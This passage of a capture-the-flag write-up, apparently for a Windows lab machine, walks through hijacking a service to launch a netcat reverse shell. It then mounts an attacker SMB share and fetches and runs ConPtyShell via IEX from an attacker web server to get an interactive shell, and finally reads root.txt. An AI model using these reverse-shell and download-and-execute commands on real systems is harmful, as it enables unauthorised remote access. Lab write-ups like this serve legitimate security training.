> C:\ProgramData\nc.exe -e powershell.exe 10.10.16.24 443                                                                    True VMTools          
> "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
> "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
> "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc   
> ```
>

###### *Set the Listener and Restart the Service to get Remote Access*

Note that we have specified that the *netcat binary* sends a *powershell.exe* instance to our *listening port*

Therefore, before proceed to restart the *VMTools service*, set the listener on the *attacking machine*

```bash
rlwrap -CaR nc -nlvp 443
```

Then, from the *target*, stop and restart the *service*

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

> [!NOTE]- *Listener Command Output*
>
> ```bash
> rlwrap -CaR nc -nlvp 443
> listening on [any] 443 ...
> connect to [10.10.16.24] from (UNKNOWN) [10.129.95.241] 65084
> Windows PowerShell 
> Copyright (C) Microsoft Corporation. All rights reserved.
> 
> PS C:\Windows\system32> 
> ```
>

And now we have access, but there is a problem with this *reverse shell*, since the service is being launched running the *netcat binary* that we have uploaded to the *target*, it fails after a few seconds and the shell we receive hangs out

###### *Getting a Persistent and Fully Interactive Shell"

Thefore, I would recommend, before launch the service, to prepare the following command to associate a *Logical Unit* to the *SMB Server* we have as we did before

```bash
net use X: \\10.10.16.24\smbFolder /USER:4l3xbb 4l3xbb
```

And run the *netcat binary* directly from the *share* specifying another listening port

So, proceed as follows →

- ***From the Attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp 1234
```

> [!IMPORTANT]-
>
> Remember that we have another listener ready to receive the first connection from the launched service
>

- ***From the Target*** 🎯

Again, stop and start the service

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

Then, we receive the first *reverse connection* from the launched service

Quickly proceed as follows to associate a shared folder to a local drive and remotely run the *netcat binary*

```bash
net use Y: \\10.10.16.24\smbFolder /USER:4l3xbb 4l3xbb
```

> [!NOTE]- *Command Output*
>
> ```bash
> net use Y: \\10.10.16.24\smbFolder /USER:4l3xbb 4l3xbb
> The command completed successfully.
> ```
>

```bash
Y:\nc.exe -e powershell.exe 10.10.16.24 1234
```

> [!NOTE]- *Second Listener's Command Output*
>
> ```bash
> Listening on [any] 1234 ...
> connect to [10.10.16.24] from (UNKNOWN) [10.129.95.241] 65133
> Windows PowerShell 
> Copyright (C) Microsoft Corporation. All rights reserved.
> 
> PS C:\Windows\system32> 
> ```
>

We now have a persistent shell and not a volatile one

But, we need to upgrade it to a *Fully Interactive TTY* as the *shell* we have now will die if we press `C-c` to interrupt a process created from the shell we have

So, we can use ***[ConPtyShell](https://github.com/antonioCoco/ConPtyShell)*** to achieve this task

Basically we need to import a *powershell module* called *Invoke-ConPtyShell.ps1*, which uses a function called *CreatePseudoConsole()*, which is availabe since *Windows 10* and *Windows Server 2019 version 1809 (build 10.0.17763)*

Therefore, let's check if the *target's OS version* is more recent than the ones listed above

```bash
systeminfo | Select-String -Pattern 'OS\s(Name|Version)'
```

> [!NOTE]- *Command Output*
>
> ```bash
> OS Name:                   Microsoft Windows Server 2019 Standard
> OS Version:                10.0.17763 N/A Build 17763
> BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024 
> ```
>

And it is! In fact It is the same as above

Proceed as follows to upgrade it using *ConPtyShell*

- ***From the Attacker*** ⚔️

> ***[Reference](https://github.com/antonioCoco/ConPtyShell)***

Git clone the repository and set up a *Simple HTTP Server* with python in order to transfer the *powershell module* to the *target*

```bash
git clone https://github.com/antonioCoco/ConPtyShell ConPtyShell
```

```bash
cd !$ && python3 -m http.server 8888
```

- ***From the Target*** 🎯

Request the shared resource from the *target*

```bash
IEX (New-Object Net.WebClient).downloadString('http://10.10.16.24:8888/Invoke-ConPtyShell.ps1')
```

- ***From the Attacker*** ⚔️

Get the rows and columns number of the current terminal

```bash
stty size
```

> [!NOTE]- *Command Output*
>
> ```bash
> 61 248
> ```
> 	

Then, set up a *listening port* and wait for the connections to be received

```bash
nc -nlvp 443
```

- ***From the Target*** 🎯 

Pass the following parameters to the *powershell function* to send the *reverse shell* to the attacker

```bash
Invoke-ConPtyShell -RemoteIp 10.10.16.25 -RemotePort 443 -Rows 61 -Cols 248
```

> [!NOTE]- *Command Output*
>
> ```bash
> CreatePseudoConsole function found! Spawning a fully interactive shell
> ```
>

Finally, proceed as follows →

```bash title="Attacker"
C-z
stty raw -echo ; fg
Enter
```

And that's it! We have a *Fully Interactive TTY*

It only remains to get the content of the flag *root.txt* 😊

```bash
Get-Content C:\Users\Administrator\Desktop\root.txt 
```